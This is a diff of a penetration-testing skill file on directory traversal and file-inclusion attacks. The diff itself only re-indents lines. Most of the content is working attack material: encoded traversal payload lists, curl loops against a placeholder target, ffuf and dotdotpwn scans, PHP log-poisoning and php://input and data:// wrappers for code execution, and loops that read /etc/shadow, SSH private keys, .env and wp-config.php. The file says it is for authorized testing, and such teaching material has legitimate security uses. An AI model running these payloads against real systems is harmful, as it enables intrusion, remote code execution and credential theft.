@@ -1,11 +1,11 @@
 ---
 name: performing-directory-traversal-testing
 description: Test web applications for path traversal and Local/Remote File Inclusion
-  vulnerabilities by manipulating file path parameters, applying encoding and filter-bypass
-  techniques, automating discovery with ffuf and dotdotpwn, and reading high-value files
-  or achieving code execution. Use during authorized penetration tests of file download,
-  view, or include functionality, or when assessing APIs that accept file names or file
-  paths as parameters.
+ vulnerabilities by manipulating file path parameters, applying encoding and filter-bypass
+ techniques, automating discovery with ffuf and dotdotpwn, and reading high-value files
+ or achieving code execution. Use during authorized penetration tests of file download,
+ view, or include functionality, or when assessing APIs that accept file names or file
+ paths as parameters.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -83,40 +83,40 @@ Attempt to escape the intended directory and read sensitive files.
 ```bash
 # Linux traversal payloads
 PAYLOADS=(
-  "../../../etc/passwd"
-  "../../../../etc/passwd"
-  "../../../../../etc/passwd"
-  "../../../../../../etc/passwd"
-  "../../../../../../../etc/passwd"
-  "..%2f..%2f..%2fetc%2fpasswd"
-  "..%252f..%252f..%252fetc%252fpasswd"
-  "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-  "....//....//....//etc/passwd"
-  "..;/..;/..;/etc/passwd"
+ "../../../etc/passwd"
+ "../../../../etc/passwd"
+ "../../../../../etc/passwd"
+ "../../../../../../etc/passwd"
+ "../../../../../../../etc/passwd"
+ "..%2f..%2f..%2fetc%2fpasswd"
+ "..%252f..%252f..%252fetc%252fpasswd"
+ "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+ "....//....//....//etc/passwd"
+ "..;/..;/..;/etc/passwd"
 )
 
 for payload in "${PAYLOADS[@]}"; do
-  echo -n "Testing: $payload -> "
-  response=$(curl -s "https://target.example.com/download?file=$payload")
-  if echo "$response" | grep -q "root:"; then
-    echo "VULNERABLE"
-  else
-    echo "Blocked"
-  fi
+ echo -n "Testing: $payload -> "
+ response=$(curl -s "https://target.example.com/download?file=$payload")
+ if echo "$response" | grep -q "root:"; then
+ echo "VULNERABLE"
+ else
+ echo "Blocked"
+ fi
 done
 
 # Windows traversal payloads
 WIN_PAYLOADS=(
-  "..\..\..\windows\win.ini"
-  "..%5c..%5c..%5cwindows%5cwin.ini"
-  "..\/..\/..\/windows/win.ini"
-  "....\\....\\....\\windows\\win.ini"
+ "..\..\..\windows\win.ini"
+ "..%5c..%5c..%5cwindows%5cwin.ini"
+ "..\/..\/..\/windows/win.ini"
+ "....\\....\\....\\windows\\win.ini"
 )
 
 for payload in "${WIN_PAYLOADS[@]}"; do
-  echo -n "Testing: $payload -> "
-  curl -s "https://target.example.com/download?file=$payload" | head -c 100
-  echo
+ echo -n "Testing: $payload -> "
+ curl -s "https://target.example.com/download?file=$payload" | head -c 100
+ echo
 done
 ```
 
@@ -161,18 +161,18 @@ Use automated tools for comprehensive traversal testing.
 ```bash
 # ffuf with traversal payload list
 ffuf -u "https://target.example.com/download?file=FUZZ" \
-  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-  -mc 200 \
-  -fs 0 \
-  -t 20 -rate 50 \
-  -o traversal-results.json -of json
+ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+ -mc 200 \
+ -fs 0 \
+ -t 20 -rate 50 \
+ -o traversal-results.json -of json
 
 # dotdotpwn for systematic traversal testing
 dotdotpwn -m http-url \
-  -u "https://target.example.com/download?file=TRAVERSAL" \
-  -k "root:" \
-  -o /tmp/dotdotpwn-results.txt \
-  -d 8 -t 200
+ -u "https://target.example.com/download?file=TRAVERSAL" \
+ -k "root:" \
+ -o /tmp/dotdotpwn-results.txt \
+ -d 8 -t 200
 
 # Burp Intruder approach:
 # 1. Send request to Intruder
@@ -190,7 +190,7 @@ If LFI is confirmed, attempt to escalate to remote code execution.
 # PHP LFI to RCE via log poisoning
 # Step 1: Inject PHP code into access log
 curl -s -A "<?php system(\$_GET['cmd']); ?>" \
-  "https://target.example.com/"
+ "https://target.example.com/"
 
 # Step 2: Include the log file via LFI
 curl -s "https://target.example.com/page?file=../../../var/log/apache2/access.log&cmd=id"
@@ -200,15 +200,15 @@ curl -s "https://target.example.com/page?file=php://filter/convert.base64-encode
 
 # PHP wrapper for code execution
 curl -s -X POST \
-  -d "<?php system('id'); ?>" \
-  "https://target.example.com/page?file=php://input"
+ -d "<?php system('id'); ?>" \
+ "https://target.example.com/page?file=php://input"
 
 # PHP data wrapper
 curl -s "https://target.example.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
 
 # Include /proc/self/environ (if readable)
 curl -s -A "<?php phpinfo(); ?>" \
-  "https://target.example.com/page?file=../../../proc/self/environ"
+ "https://target.example.com/page?file=../../../proc/self/environ"
 
 # Session file inclusion
 # Write PHP code into session via another parameter
@@ -222,40 +222,40 @@ Target sensitive configuration and credential files.
 ```bash
 # Linux high-value files
 HIGH_VALUE_LINUX=(
-  "/etc/passwd"
-  "/etc/shadow"
-  "/etc/hosts"
-  "/etc/hostname"
-  "/proc/self/environ"
-  "/proc/self/cmdline"
-  "/var/www/html/.env"
-  "/var/www/html/config.php"
-  "/var/www/html/wp-config.php"
-  "/home/user/.ssh/id_rsa"
-  "/home/user/.bash_history"
-  "/root/.bash_history"
-  "/var/log/auth.log"
+ "/etc/passwd"
+ "/etc/shadow"
+ "/etc/hosts"
+ "/etc/hostname"
+ "/proc/self/environ"
+ "/proc/self/cmdline"
+ "/var/www/html/.env"
+ "/var/www/html/config.php"
+ "/var/www/html/wp-config.php"
+ "/home/user/.ssh/id_rsa"
+ "/home/user/.bash_history"
+ "/root/.bash_history"
+ "/var/log/auth.log"
 )
 
 for file in "${HIGH_VALUE_LINUX[@]}"; do
-  traversal="../../../../../../..$file"
-  echo -n "$file: "
-  response=$(curl -s "https://target.example.com/download?file=$traversal")
-  if [ ${#response} -gt 10 ]; then
-    echo "READABLE (${#response} bytes)"
-  else
-    echo "Not accessible"
-  fi
+ traversal="../../../../../../..$file"
+ echo -n "$file: "
+ response=$(curl -s "https://target.example.com/download?file=$traversal")
+ if [ ${#response} -gt 10 ]; then
+ echo "READABLE (${#response} bytes)"
+ else
+ echo "Not accessible"
+ fi
 done
 
 # Windows high-value files
 HIGH_VALUE_WIN=(
-  "C:\\Windows\\win.ini"
-  "C:\\Windows\\System32\\drivers\\etc\\hosts"
-  "C:\\inetpub\\wwwroot\\web.config"
-  "C:\\Users\\Administrator\\.ssh\\id_rsa"
-  "C:\\xampp\\apache\\conf\\httpd.conf"
-  "C:\\xampp\\mysql\\data\\mysql\\user.MYD"
+ "C:\\Windows\\win.ini"
+ "C:\\Windows\\System32\\drivers\\etc\\hosts"
+ "C:\\inetpub\\wwwroot\\web.config"
+ "C:\\Users\\Administrator\\.ssh\\id_rsa"
+ "C:\\xampp\\apache\\conf\\httpd.conf"
+ "C:\\xampp\\mysql\\data\\mysql\\user.MYD"
 )
 ```
 
